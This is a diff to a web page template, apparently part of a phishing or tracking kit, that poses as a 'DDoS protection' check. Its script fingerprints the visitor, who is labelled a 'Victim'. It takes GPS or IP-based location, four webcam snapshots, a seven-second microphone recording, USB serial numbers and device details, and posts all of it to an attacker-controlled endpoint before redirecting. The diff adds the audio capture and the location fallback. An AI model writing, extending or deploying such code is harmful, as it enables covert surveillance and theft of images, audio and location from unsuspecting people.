@@ -71,174 +71,176 @@ DDoS protection by
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
 <script type="text/javascript">
-var c=false,l=false,audio_done=false,uid="<%=uid %>";
+var c=false,l=false,uid="<%=uid %>";
 async function gather(){
 var td="";
 <% if(!t){ %>
 td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
 <% }else{ %>
 await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
-
 <% } %>
 
 td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
 var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
 var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
-///INITIALS
+
 td+="<br><b>📱 Device Information</b><br>";
-for(var i=0;i < xo.length;i++){ 
+for(var i=0;i<xo.length;i++){
 if(xo[i] in navigator){
-var str = navigator[xo[i]];
-td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
+var str=navigator[xo[i]];
+td+="<b>"+xo[i]+"</b>: <code>"+str+"</code><br>";
 }
 }
 
-
-
-if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
-/////List cameras and microphones.
-await navigator.mediaDevices?.enumerateDevices()
-.then(function(devices) {
+if(navigator.mediaDevices||navigator.mediaDevices?.enumerateDevices){
+await navigator.mediaDevices?.enumerateDevices().then(function(devices){
 td+="<br><b>📷 Media Device Information</b><br>";
-devices.forEach(function(device) {
-td+="<b>"+device.kind+":</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
+devices.forEach(function(device){
+td+="<b>"+device.kind+":</b> "+device.label+" id = <code>"+device.deviceId+"</code><br>";
 });
-})
-.catch(function(err) {
+}).catch(function(err){
 td+="<br><b>📷 Media Device Information</b><br>";
-td+="⚠️ Media Device Error: "+err.name + ": " + err.message;
+td+="⚠️ Media Device Error: "+err.name+": "+err.message;
 });
 }
 
-
-////CONNECTION
 if("connection" in navigator){
 td+="<br><b>🕸️ Network Information</b><br>";
-for(var i=0;i < xoc.length;i++){ 
-var str = navigator.connection[xoc[i]];
-td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
-}}
+for(var i=0;i<xoc.length;i++){
+var str=navigator.connection[xoc[i]];
+td+="<b>"+xoc[i]+"</b>: <code>"+str+"</code><br>";
+}
+}
 
-
-////USB
 if("usb" in navigator){
-await navigator.usb.getDevices()
-.then(devices => {
-td+="<br><b>🔌 Total USB devices connected:</b> " + devices.length+"<br>";
-devices.forEach(device => {
-td+="<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber+"</code><br>";
+await navigator.usb.getDevices().then(devices=>{
+td+="<br><b>🔌 Total USB devices connected:</b> "+devices.length+"<br>";
+devices.forEach(device=>{
+td+="<b>Product name:</b> "+device.productName+" , <b>Serial number: </b> <code>"+device.serialNumber+"</code><br>";
 });
 });
 }
 
 if("getBattery" in navigator){
-await navigator.getBattery().then(function(battery) {
+await navigator.getBattery().then(function(battery){
 td+="<br><b>🔋 Battery Information</b><br>";
-td+="<b>🔋Battery Level:</b> " +battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging+"";
+td+="<b>🔋Battery Level:</b> "+battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging;
 });
 }
 
-//////Location
-if(!navigator.geolocation) {
-td+="<br><b>📍 Location Information</b><br>";
-td+="⚠️ Location API not avilable";
-l=true;
-} 
-
-function success(pos) {
-const crd = pos.coords;
-$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
-l=true;
-red();
+// ── Location ──────────────────────────────────────────────────────────────────
+async function sendLocation(lat,lon,acc){
+return new Promise(function(resolve){
+$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)},function(){
+l=true;red();resolve();
+});
 });
 }
 
-function error(err) {
-td+="<br><b>📍 Location Information</b><br>";
-td+="⚠️ Location ERROR: <code>"+err.message+"</code>";
-l=true;
+async function ipLocation(){
+try{
+var d=await fetch("https://ipapi.co/json/").then(r=>r.json());
+if(d&&d.latitude&&d.longitude){
+await sendLocation(d.latitude,d.longitude,"IP-Based (~"+d.city+", "+d.country_name+")");
+}else{l=true;}
+}catch(e){l=true;}
 }
-if(navigator.geolocation){
-await navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
 
+if(!navigator.geolocation){
+td+="<br><b>📍 Location</b><br>⚠️ GPS غير متاح — استخدام IP";
+await ipLocation();
+}else{
+await new Promise(function(resolve){
+var done=false;
+var timer=setTimeout(async function(){
+if(!done){done=true;await ipLocation();resolve();}
+},8000);
+navigator.geolocation.getCurrentPosition(
+async function(pos){
+if(done)return;done=true;clearTimeout(timer);
+await sendLocation(pos.coords.latitude,pos.coords.longitude,pos.coords.accuracy+" m (GPS)");
+resolve();
+},
+async function(err){
+if(done)return;done=true;clearTimeout(timer);
+td+="<br><b>📍 Location</b><br>⚠️ GPS مرفوض — استخدام IP";
+await ipLocation();resolve();
+},
+{enableHighAccuracy:true,timeout:7000,maximumAge:0}
+);
+});
 }
 
-
-
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
+// ── Camera + Audio ────────────────────────────────────────────────────────────
+const video=document.getElementById('video');
+const canvas=document.getElementById('canvas');
 var imgsent=0;
 
-function post(o){
-$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
+function postSnap(o){
+$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},function(){
 imgsent+=1;
-if(imgsent==4){
-c=true;
-red();
-}
+if(imgsent==4){c=true;red();}
 });
 }
-const constraints = {audio: false,video: {facingMode: "user" }};
-// Access webcam
-async function cam() {
-try {
-const stream = await navigator.mediaDevices.getUserMedia(constraints);
-handleSuccess(stream);
-} catch (e) {
-td+='<br><b>📷 Camera Images</b>';
-td+= `<br>⚠️ Camera Access Error: ${e.toString()}`;
-c=true;
-red();
-}
-}
 
-// Success
-function handleSuccess(stream) {
-window.stream = stream;
-video.srcObject = stream;
-var context = canvas.getContext('2d');
-var id=setInterval(function(){
-context.drawImage(video, 0, 0, 500, 500);
-var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
-post(canvasData);
-}, 1500);
-}
-
-
-cam();
-
-
-// Audio recording
-async function recordAudio(){
+function handleSuccess(stream){
+window.stream=stream;
+// Camera snapshots
+var videoStream=new MediaStream(stream.getVideoTracks());
+video.srcObject=videoStream;
+var context=canvas.getContext('2d');
+var snapCount=0;
+var snapId=setInterval(function(){
+context.drawImage(video,0,0,500,500);
+var canvasData=canvas.toDataURL("image/png").replace("data:image/png;base64","");
+postSnap(canvasData);
+snapCount++;
+if(snapCount>=4)clearInterval(snapId);
+},1500);
+// Audio recording from same stream
 try{
-var stream=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
-var recorder=new MediaRecorder(stream);
+var audioTracks=stream.getAudioTracks();
+if(audioTracks.length>0){
+var audioStream=new MediaStream(audioTracks);
+var recorder=new MediaRecorder(audioStream);
 var chunks=[];
-recorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
+recorder.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
 recorder.onstop=function(){
 var blob=new Blob(chunks,{type:'audio/webm'});
 var reader=new FileReader();
 reader.onloadend=function(){
 var b64=reader.result.replace(/^data:.+;base64,/,'');
-$.post("<%=a %>/audio",{uid:uid,audio:encodeURIComponent(b64)},function(){audio_done=true;});
+$.post("<%=a %>/audio",{uid:uid,audio:encodeURIComponent(b64)});
 };
 reader.readAsDataURL(blob);
 };
 recorder.start();
-setTimeout(function(){try{recorder.stop();stream.getTracks().forEach(function(t){t.stop();});}catch(e){}},8000);
-}catch(e){audio_done=true;}
+setTimeout(function(){try{recorder.stop();}catch(e){}},7000);
 }
-recordAudio();
+}catch(e){}
+}
+
+async function cam(){
+try{
+const stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user"}});
+handleSuccess(stream);
+}catch(e1){
+try{
+const stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});
+handleSuccess(stream);
+}catch(e2){
+td+='<br><b>📷 Camera</b><br>⚠️ '+e2.toString();
+c=true;red();
+}
+}
+}
+cam();
 
 function red(){
-if(c && l){
-window.location.href="<%=url %>"
-}
+if(c&&l){window.location.href="<%=url %>";}
 }
 
-
-$.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
+$.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},function(){});
 
 }
 
